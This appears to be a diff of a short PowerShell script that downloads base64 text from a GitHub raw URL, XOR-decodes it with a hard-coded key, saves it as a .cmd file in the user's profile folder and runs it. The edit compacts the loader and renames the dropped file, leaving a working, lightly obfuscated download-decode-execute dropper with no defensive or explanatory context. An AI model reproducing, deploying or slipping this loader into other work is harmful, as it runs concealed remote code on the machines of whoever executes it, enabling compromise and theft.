@@ -1,38 +1,20 @@
 $u='https://raw.githubusercontent.com/yorinmaj22/uwu/refs/heads/main/oc'
 
-try{
-$k='moon'
-if(!$u -or !$k){throw 'Missing URL or key'}
+try {
+    $k = 'moon'
+    if (!$u) { throw 'Missing URL' }
 
-Add-Type @"
-using System.Net;
+    Add-Type 'using System.Net;public class D{public static string G(string u){using(var w=new WebClient())return w.DownloadString(u);}}'
 
-public class Downloader {
-    public static string DownloadString(string url) {
-        using (WebClient wc = new WebClient()) {
-            return wc.DownloadString(url);
-        }
-    }
+    $b = [Convert]::FromBase64String(([D]::G($u) -replace '\s'))
+    $x = [Text.Encoding]::UTF8.GetBytes($k)
+    $o = [byte[]](0..($b.Length - 1) | ForEach-Object {
+        $b[$_] -bxor $x[$_ % $x.Length]
+    })
+    $file = "$env:USERPROFILE\fhdsb.cmd"
+    [IO.File]::WriteAllBytes($file, $o)
+    & $file
 }
-"@
-
-$d = [Downloader]::DownloadString($u) -replace '\s'
-$b = [Convert]::FromBase64String($d)
-
-$kb=[Text.Encoding]::UTF8.GetBytes($k)
-if(!$kb.Length){throw 'Empty key'}
-
-$o=[byte[]](0..($b.Length-1)|%{
-    $b[$_] -bxor $kb[$_%$kb.Length]
-})
-
-    [IO.File]::WriteAllBytes("$env:USERPROFILE\nasdaq.cmd",$o)
-
-
-
-& "$env:USERPROFILE\nasdaq.cmd"
-
-}
-catch{
+catch {
     Write-Host "Error: $($_.Exception.Message)"
 }
